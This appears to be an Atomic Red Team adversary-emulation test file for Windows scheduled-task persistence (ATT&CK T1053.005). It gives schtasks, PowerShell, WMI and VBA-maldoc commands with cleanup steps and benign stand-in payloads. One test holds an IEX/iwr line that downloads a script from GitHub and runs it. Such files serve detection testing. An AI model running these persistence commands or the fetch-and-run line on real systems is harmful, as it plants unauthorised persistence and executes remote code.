@@ -1,0 +1,143 @@
+---
+attack_technique: T1053.005
+display_name: 'Scheduled Task/Job: Scheduled Task'
+atomic_tests:
+- name: Scheduled Task Startup Script
+  auto_generated_guid: fec27f65-db86-4c2d-b66c-61945aee87c2
+  description: |
+    Run an exe on user logon or system startup.  Upon execution, success messages will be displayed for the two scheduled tasks. To view
+    the tasks, open the Task Scheduler and look in the Active Tasks pane.
+  supported_platforms:
+  - windows
+  executor:
+    command: |
+      schtasks /create /tn "T1053_005_OnLogon" /sc onlogon /tr "cmd.exe /c calc.exe"
+      schtasks /create /tn "T1053_005_OnStartup" /sc onstart /ru system /tr "cmd.exe /c calc.exe"
+    cleanup_command: |
+      schtasks /delete /tn "T1053_005_OnLogon" /f >nul 2>&1
+      schtasks /delete /tn "T1053_005_OnStartup" /f >nul 2>&1
+    name: command_prompt
+    elevation_required: true
+- name: Scheduled task Local
+  auto_generated_guid: 42f53695-ad4a-4546-abb6-7d837f644a71
+  description: |
+    Upon successful execution, cmd.exe will create a scheduled task to spawn cmd.exe at 20:10.
+  supported_platforms:
+    - windows
+  input_arguments:
+    task_command:
+      description: What you want to execute
+      type: String
+      default: C:\windows\system32\cmd.exe
+    time:
+      description: What time 24 Hour
+      type: String
+      default: "20:10"
+  executor:
+    name: command_prompt
+    elevation_required: false
+    command: |
+      SCHTASKS /Create /SC ONCE /TN spawn /TR #{task_command} /ST #{time}
+    cleanup_command: |
+      SCHTASKS /Delete /TN spawn /F >nul 2>&1
+- name: Scheduled task Remote
+  auto_generated_guid: 2e5eac3e-327b-4a88-a0c0-c4057039a8dd
+  description: |
+      Create a task on a remote system.
+
+      Upon successful execution, cmd.exe will create a scheduled task to spawn cmd.exe at 20:10 on a remote endpoint.
+  supported_platforms:
+    - windows
+  input_arguments:
+    task_command:
+      description: What you want to execute
+      type: String
+      default: C:\windows\system32\cmd.exe
+    time:
+      description: What time 24 Hour
+      type: String
+      default: "20:10"
+    target:
+      description: Target
+      type: String
+      default: localhost
+    user_name:
+      description: 'Username to authenticate with, format: DOMAIN\User'
+      type: String
+      default: DOMAIN\user
+    password:
+      description: Password to authenticate with
+      type: String
+      default: At0micStrong
+  executor:
+    name: command_prompt
+    elevation_required: true
+    command: |
+      SCHTASKS /Create /S #{target} /RU #{user_name} /RP #{password} /TN "Atomic task" /TR "#{task_command}" /SC daily /ST #{time}
+    cleanup_command: |
+      SCHTASKS /Delete /S #{target} /U #{user_name} /P #{password} /TN "Atomic task" /F >nul 2>&1
+- name: Powershell Cmdlet Scheduled Task
+  auto_generated_guid: af9fd58f-c4ac-4bf2-a9ba-224b71ff25fd
+  description: |
+    Create an atomic scheduled task that leverages native powershell cmdlets.
+
+    Upon successful execution, powershell.exe will create a scheduled task to spawn cmd.exe at 20:10.
+  supported_platforms:
+    - windows
+  executor:
+    name: powershell
+    elevation_required: false
+    command: |
+      $Action = New-ScheduledTaskAction -Execute "calc.exe"
+      $Trigger = New-ScheduledTaskTrigger -AtLogon
+      $User = New-ScheduledTaskPrincipal -GroupId "BUILTIN\Administrators" -RunLevel Highest
+      $Set = New-ScheduledTaskSettingsSet
+      $object = New-ScheduledTask -Action $Action -Principal $User -Trigger $Trigger -Settings $Set
+      Register-ScheduledTask AtomicTask -InputObject $object
+    cleanup_command: |
+      Unregister-ScheduledTask -TaskName "AtomicTask" -confirm:$false >$null 2>&1
+- name: Task Scheduler via VBA
+  auto_generated_guid: ecd3fa21-7792-41a2-8726-2c5c673414d3
+  description: |
+    This module utilizes the Windows API to schedule a task for code execution (notepad.exe). The task scheduler will execute "notepad.exe" within
+    30 - 40 seconds after this module has run
+  supported_platforms:
+  - windows
+  input_arguments:
+    ms_product:
+      description: Maldoc application Word
+      type: String
+      default: Word
+  dependency_executor_name: powershell
+  dependencies:
+  - description: |
+      Microsoft #{ms_product} must be installed
+    prereq_command: |
+      try {
+        New-Object -COMObject "#{ms_product}.Application" | Out-Null
+        $process = "#{ms_product}"; if ( $process -eq "Word") {$process = "winword"}
+        Stop-Process -Name $process
+        exit 0
+      } catch { exit 1 }
+    get_prereq_command: |
+      Write-Host "You will need to install Microsoft #{ms_product} manually to meet this requirement"
+  executor:
+    command: |
+      [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+      IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" -UseBasicParsing) 
+      Invoke-MalDoc -macroFile "PathToAtomicsFolder\T1053.005\src\T1053.005-macrocode.txt" -officeProduct "#{ms_product}" -sub "Scheduler"
+    name: powershell
+- name: WMI Invoke-CimMethod Scheduled Task
+  auto_generated_guid: e16b3b75-dc9e-4cde-a23d-dfa2d0507b3b
+  description: |
+    Create an scheduled task that executes notepad.exe after user login from XML by leveraging WMI class PS_ScheduledTask. Does the same thing as Register-ScheduledTask cmdlet behind the scenes.
+  supported_platforms:
+    - windows
+  executor:
+    name: powershell
+    elevation_required: true
+    command: |
+      $xml = [System.IO.File]::ReadAllText("PathToAtomicsFolder\T1053.005\src\T1053_005_WMI.xml")
+      Invoke-CimMethod -ClassName PS_ScheduledTask -NameSpace "Root\Microsoft\Windows\TaskScheduler" -MethodName "RegisterByXml" -Arguments @{ Force = $true; Xml =$xml; }
+    cleanup_command: |
+      Unregister-ScheduledTask -TaskName "T1053_005_WMI" -confirm:$false >$null 2>&1
